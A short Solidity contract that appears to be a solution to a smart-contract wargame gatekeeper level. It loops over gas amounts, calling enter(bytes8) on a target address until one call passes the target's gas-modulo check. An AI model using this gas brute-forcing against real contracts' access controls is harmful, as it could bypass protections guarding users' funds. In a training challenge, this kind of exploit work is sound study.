// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract EnterGateKeeper {
    bytes public returnedData;

    function youShallPass(bytes8 _gateKey, address _gateKeeperAddress) public {
        for (uint256 i = 0; i < 8191; i++) {
            (bool success,) =
                _gateKeeperAddress.call{gas: i + 81910}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (success) {
                break;
            }
        }
        // (bool success, ) = _gateKeeperAddress.call{gas: _gas}(abi.encodeWithSignature("enter(bytes8)",_gateKey));
        // if(!success){
        //     revert();
        // }
    }
}
